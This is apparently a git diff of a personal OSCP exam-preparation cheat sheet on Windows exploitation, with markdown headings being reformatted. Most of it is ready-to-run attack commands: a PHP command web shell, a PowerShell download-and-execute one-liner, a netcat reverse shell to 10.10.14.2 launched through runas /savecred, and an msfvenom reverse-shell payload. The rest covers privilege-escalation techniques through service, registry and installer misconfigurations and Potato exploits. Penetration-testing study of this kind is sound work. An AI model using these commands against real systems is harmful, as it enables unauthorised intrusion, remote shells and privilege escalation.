@@ -1,23 +1,23 @@
 # OSCP_Prep
 
-Simple php cmd shell
+## Simple php cmd shell
 	<?php echo system($_GET["cmd"]); ?>
 	<?php echo shell_exec($_GET["cmd"]); ?>
 
-Run cmd from cmdshell:
+## Run cmd from cmdshell:
 	cmd /c
 	cmd /k
 
 
-# Powershell download a file
+## Powershell download a file
 	powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 
 
 
-# Powershell download an execute file
+## Powershell download an execute file
 	powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<IP>/<script>')"
 
 
-# Powershell execution restricted
+## Powershell execution restricted
 	echo $storageDir = $pwd > wget.ps1
 	echo $webclient = New-Object System.Net.WebClient >>wget.ps1
 	echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
@@ -28,7 +28,7 @@ Run cmd from cmdshell:
 	powershell.exe -nop -ep bypass -c wget.ps1
 
 
-# check privileges
+## check privileges
 	whoami /priv
 	
 	if SeImpersonatePrivilege privilege enabled.
@@ -36,12 +36,12 @@ Run cmd from cmdshell:
 			https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
 			
 
-#check for saved credentials 
+## check for saved credentials 
 	cmdkey /list
 
 	runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"
  
-# Transfer file with SMB 
+## Transfer file with SMB 
 	sudo impacket-smbserver ROPNOP /sherad/folder
 
     Check share on target host:
@@ -49,7 +49,7 @@ Run cmd from cmdshell:
 	ls \\shareIP\ROPNOP
 
 
-# IIS WebDav exploatation
+## IIS WebDav exploatation
 	Use "cadaver" to check PUT method and directory listing
 	Use "davtest" to check writable extentions
  	
@@ -71,18 +71,18 @@ Run cmd from cmdshell:
 		msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.7 LPORT=1234 -o shell.aspx
 
 
-## Windows privesc
+# Windows privesc
 
-#Stored Credentials
+## Stored Credentials
 	1. Search the registry for usernames and passwords.
 	2. If cmdkey /list returns entries, it means that you may able to runas certain user who stored his credentials in windows.
 		runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"
 	
-# Windows kernel exploatation
+## Windows kernel exploatation
 	 https://github.com/SecWiki/windows-kernel-exploits
 
 
-# DLL Hijacking 
+## DLL Hijacking 
 
 	Generally, a Windows application will use pre-defined search paths to find DLL’s and it will check these paths in a specific order.
 
@@ -93,7 +93,7 @@ Run cmd from cmdshell:
 	5. The current working directory (CWD)
 	6. Directories in the PATH environment variable (first system and then user)
 
-# Unquoted Service Paths
+## Unquoted Service Paths
 	When a service is started Windows will search for the binary to execute. The location of the binary to be executed is declared in the binPath attribute. 
 	If the path to the binary is unquoted, Windows does not know where the binary is located and will search in all folders, from the beginning of the path.
 
@@ -121,7 +121,7 @@ Run cmd from cmdshell:
 	Execute the payload by starting the service using: 
 		sc start unquotedsvc
 
-# Weak Folder Permissions
+## Weak Folder Permissions
 	If a user has write permission in a folder used by a service, he can replace the binary with a malicious one. When the service is restarted the malicious binary is executed with higher privileges.
 	
 	Replacing the file by copying the payload to the service binary location. Restart the service to execute the payload with higher privilege.
@@ -130,7 +130,7 @@ Run cmd from cmdshell:
 	copy /y C:\Users\user\Desktop\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
 	sc start filepermsvc
 
-# Weak Service Permissions
+## Weak Service Permissions
 
 	Services created by SYSTEM having weak permissions can lead to privilege escalation.
 	If a low privileged user can modify the service configuration, i.e. change the binPath to a malicious binary and restart the service then, the malicious binary will be executed with SYSTEM privileges.
@@ -141,7 +141,7 @@ Run cmd from cmdshell:
 
 		sc config daclsvc binpath= "C:\Users\user\Desktop\shell.exe"
 
-# Weak Registry Permission
+## Weak Registry Permission
 	In Windows, services have a registry keys and those keys are located at: 
 		HKLM\SYSTEM\CurrentControlSet\Services\<service_name>
 	If Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl in any of the services, in that case, you can change the binary that is going to be executed by the service.
@@ -152,7 +152,7 @@ Run cmd from cmdshell:
 		sc start regsvc
 		
 
-# Always Install Elevated
+## Always Install Elevated
 	
 	Windows can allow low privilege users to install a Microsoft Windows Installer Package (MSI) with system privileges by the AlwaysInstallElevated group policy.
 		
@@ -160,15 +160,15 @@ Run cmd from cmdshell:
 	Install the payload using
 		msiexec /quiet /qn /i C:\Windows\Temp\setup.msi
 	
-# Modifiable Autorun
+## Modifiable Autorun
 	As the path to the autorun can be modified, we replace the file with our payload. To execute it with elevated privileges we need to wait for someone in the Admin group to login.
 	
 
-# Tater / Hot Potato !!!!!!!!!!!!!
+## Tater / Hot Potato !!!!!!!!!!!!!
 	“Hot Potato (aka: Potato) takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing.”
 		powershell -exec Bypass -c ". .\Tater.ps1;Invoke-Tater -Trigger 1 -Command 'net localgroup administrators backdoor /delete';"
 	
-# Token Manipulation
+## Token Manipulation
 	You can use the following exploits to escalate privileges.
 		1. Rotten Potato
    		2. Juicy Potato
